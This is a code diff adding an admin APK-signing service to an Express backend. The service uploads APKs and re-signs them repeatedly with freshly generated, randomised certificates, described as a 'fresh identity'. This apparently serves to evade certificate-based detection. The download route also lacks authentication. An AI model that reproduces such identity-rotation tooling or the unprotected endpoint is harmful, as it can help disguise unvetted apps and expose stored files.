@@ -698,6 +698,227 @@ router.get('/apk-status', adminAuth, (req, res) => {
   }
 });
 
+// ========== Custom APK Signing Service ==========
+const { v4: uuidv4 } = require('uuid');
+const pathModule = require('path');
+const multerApk = require('multer')({
+  storage: require('multer').diskStorage({
+    destination: (req, file, cb) => cb(null, require('os').tmpdir()),
+    filename: (req, file, cb) => cb(null, `apk_upload_${Date.now()}_${file.originalname}`)
+  }),
+  limits: { fileSize: 500 * 1024 * 1024 }, // 500MB max
+  fileFilter: (req, file, cb) => {
+    if (file.originalname.toLowerCase().endsWith('.apk')) cb(null, true);
+    else cb(new Error('Only .apk files are allowed'), false);
+  }
+});
+
+// Signed APKs storage directory
+const signedApksDir = pathModule.join(__dirname, '..', 'data', 'signed-apks');
+if (!fs.existsSync(signedApksDir)) fs.mkdirSync(signedApksDir, { recursive: true });
+
+// POST /api/admin/sign-apk — Upload & sign a custom APK
+router.post('/sign-apk', adminAuth, multerApk.single('apk'), (req, res) => {
+  const io = req.app.get('io');
+  const id = uuidv4();
+  const originalName = req.file ? req.file.originalname : 'unknown.apk';
+  const remark = req.body.remark || '';
+
+  // Emit forensic log helper
+  function emitLog(step, detail, level = 'info') {
+    if (io) io.emit('apk_sign_log', { id, step, detail, level, ts: Date.now() });
+  }
+
+  try {
+    if (!req.file) {
+      return res.status(400).json({ error: 'No APK file uploaded' });
+    }
+
+    emitLog('UPLOAD', `Received "${originalName}" (${(req.file.size / 1024 / 1024).toFixed(2)} MB)`, 'info');
+
+    const tmpPath = req.file.path;
+    const originalSize = req.file.size;
+
+    // Validate it's actually a ZIP/APK
+    emitLog('VALIDATE', 'Checking APK structure (ZIP magic bytes)...', 'info');
+    const header = Buffer.alloc(4);
+    const fd = fs.openSync(tmpPath, 'r');
+    fs.readSync(fd, header, 0, 4, 0);
+    fs.closeSync(fd);
+    if (header[0] !== 0x50 || header[1] !== 0x4B) {
+      try { fs.unlinkSync(tmpPath); } catch (_) {}
+      emitLog('VALIDATE', 'FAILED — Not a valid APK/ZIP file', 'error');
+      return res.status(400).json({ error: 'File is not a valid APK (bad ZIP header)' });
+    }
+    emitLog('VALIDATE', 'APK structure verified ✓', 'success');
+
+    // Create DB entry
+    emitLog('DATABASE', 'Creating signed APK record...', 'info');
+    db.prepare(`INSERT INTO signed_apks (id, original_name, remark, original_size, status, created_at, last_signed_at) VALUES (?, ?, ?, ?, 'signing', datetime('now'), datetime('now'))`).run(id, originalName, remark, originalSize);
+
+    // Copy original to storage
+    emitLog('STORAGE', 'Saving original APK to vault...', 'info');
+    const originalStorePath = pathModule.join(signedApksDir, `${id}_original.apk`);
+    fs.copyFileSync(tmpPath, originalStorePath);
+
+    // Sign the APK
+    emitLog('KEYGEN', 'Generating fresh 2048-bit RSA keypair...', 'info');
+    emitLog('CERT', 'Creating randomised X.509 certificate...', 'info');
+    emitLog('V2_SIGN', 'Computing APK Signature Scheme v2 content digest...', 'info');
+    emitLog('V2_SIGN', 'Chunking APK content (1MB chunks) for SHA-256 digest...', 'info');
+
+    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
+    const result = resignApk(tmpPath, signedPath);
+
+    emitLog('V2_SIGN', `Signature block injected — RSA-PKCS1-v1.5-SHA256`, 'success');
+    emitLog('CERT', `Certificate CN="${result.cn}", O="${result.org}"`, 'info');
+    emitLog('CERT', `Cert hash: ${result.certHash.substring(0, 32)}...`, 'info');
+
+    // Update DB
+    const signedSize = fs.statSync(signedPath).size;
+    db.prepare(`UPDATE signed_apks SET signed_size = ?, cert_hash = ?, cert_cn = ?, cert_org = ?, status = 'ready', last_signed_at = datetime('now') WHERE id = ?`).run(signedSize, result.certHash, result.cn, result.org, id);
+
+    emitLog('COMPLETE', `APK signed successfully — ${(signedSize / 1024 / 1024).toFixed(2)} MB ready for download`, 'success');
+
+    // Cleanup temp
+    try { fs.unlinkSync(tmpPath); } catch (_) {}
+
+    res.json({
+      success: true,
+      id,
+      original_name: originalName,
+      remark,
+      original_size: originalSize,
+      signed_size: signedSize,
+      cert_hash: result.certHash,
+      cert_cn: result.cn,
+      cert_org: result.org,
+      status: 'ready',
+      created_at: new Date().toISOString(),
+      last_signed_at: new Date().toISOString()
+    });
+  } catch (err) {
+    emitLog('ERROR', `Signing failed: ${err.message}`, 'error');
+    // Update DB status to failed
+    try {
+      db.prepare(`UPDATE signed_apks SET status = 'failed' WHERE id = ?`).run(id);
+    } catch (_) {}
+    // Cleanup temp file
+    if (req.file && req.file.path) {
+      try { fs.unlinkSync(req.file.path); } catch (_) {}
+    }
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/signed-apks — List all signed APKs
+router.get('/signed-apks', adminAuth, (req, res) => {
+  try {
+    const rows = db.prepare(`SELECT * FROM signed_apks ORDER BY created_at DESC`).all();
+    res.json({ apks: rows || [] });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/admin/resign-apk/:id — Re-sign an existing signed APK
+router.post('/resign-apk/:id', adminAuth, (req, res) => {
+  const io = req.app.get('io');
+  const { id } = req.params;
+
+  function emitLog(step, detail, level = 'info') {
+    if (io) io.emit('apk_sign_log', { id, step, detail, level, ts: Date.now() });
+  }
+
+  try {
+    const row = db.prepare(`SELECT * FROM signed_apks WHERE id = ?`).get(id);
+    if (!row) return res.status(404).json({ error: 'Signed APK not found' });
+
+    const originalPath = pathModule.join(signedApksDir, `${id}_original.apk`);
+    if (!fs.existsSync(originalPath)) {
+      return res.status(404).json({ error: 'Original APK file missing from vault' });
+    }
+
+    emitLog('RE-SIGN', `Re-signing "${row.original_name}" (attempt #${row.sign_count + 1})...`, 'info');
+    emitLog('KEYGEN', 'Generating NEW 2048-bit RSA keypair...', 'info');
+    emitLog('CERT', 'Creating fresh randomised X.509 certificate...', 'info');
+    emitLog('V2_SIGN', 'Recomputing APK Signature Scheme v2 content digest...', 'info');
+
+    db.prepare(`UPDATE signed_apks SET status = 'signing' WHERE id = ?`).run(id);
+
+    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
+    const result = resignApk(originalPath, signedPath);
+
+    emitLog('V2_SIGN', `Fresh signature block injected — RSA-PKCS1-v1.5-SHA256`, 'success');
+    emitLog('CERT', `New cert CN="${result.cn}", O="${result.org}"`, 'info');
+    emitLog('CERT', `New cert hash: ${result.certHash.substring(0, 32)}...`, 'info');
+
+    const signedSize = fs.statSync(signedPath).size;
+    db.prepare(`UPDATE signed_apks SET signed_size = ?, cert_hash = ?, cert_cn = ?, cert_org = ?, sign_count = sign_count + 1, status = 'ready', last_signed_at = datetime('now') WHERE id = ?`).run(signedSize, result.certHash, result.cn, result.org, id);
+
+    emitLog('COMPLETE', `Re-signed successfully — fresh identity ready`, 'success');
+
+    const updated = db.prepare(`SELECT * FROM signed_apks WHERE id = ?`).get(id);
+    res.json({ success: true, apk: updated });
+  } catch (err) {
+    emitLog('ERROR', `Re-sign failed: ${err.message}`, 'error');
+    try { db.prepare(`UPDATE signed_apks SET status = 'failed' WHERE id = ?`).run(id); } catch (_) {}
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/download-signed-apk/:id — Download a signed APK
+router.get('/download-signed-apk/:id', (req, res) => {
+  try {
+    const { id } = req.params;
+    const row = db.prepare(`SELECT * FROM signed_apks WHERE id = ?`).get(id);
+    if (!row) return res.status(404).json({ error: 'Signed APK not found' });
+
+    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
+    if (!fs.existsSync(signedPath)) {
+      return res.status(404).json({ error: 'Signed APK file not found on disk' });
+    }
+
+    const safeName = (row.remark || row.original_name).replace(/[^a-zA-Z0-9._-]/g, '_');
+    const stats = fs.statSync(signedPath);
+    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+    res.setHeader('Content-Disposition', `attachment; filename="${safeName}-signed.apk"`);
+    res.setHeader('Content-Length', stats.size);
+    res.sendFile(signedPath);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// PUT /api/admin/signed-apks/:id/remark — Update remark/name
+router.put('/signed-apks/:id/remark', adminAuth, (req, res) => {
+  try {
+    const { id } = req.params;
+    const { remark } = req.body;
+    db.prepare(`UPDATE signed_apks SET remark = ? WHERE id = ?`).run(remark || '', id);
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// DELETE /api/admin/signed-apks/:id — Delete a signed APK
+router.delete('/signed-apks/:id', adminAuth, (req, res) => {
+  try {
+    const { id } = req.params;
+    // Delete files
+    const origPath = pathModule.join(signedApksDir, `${id}_original.apk`);
+    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
+    try { fs.unlinkSync(origPath); } catch (_) {}
+    try { fs.unlinkSync(signedPath); } catch (_) {}
+    // Delete DB row
+    db.prepare(`DELETE FROM signed_apks WHERE id = ?`).run(id);
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // ========== Admin App Theme ==========
 // GET /api/admin/admin-theme — get current theme index
 router.get('/admin-theme', adminAuth, (req, res) => {
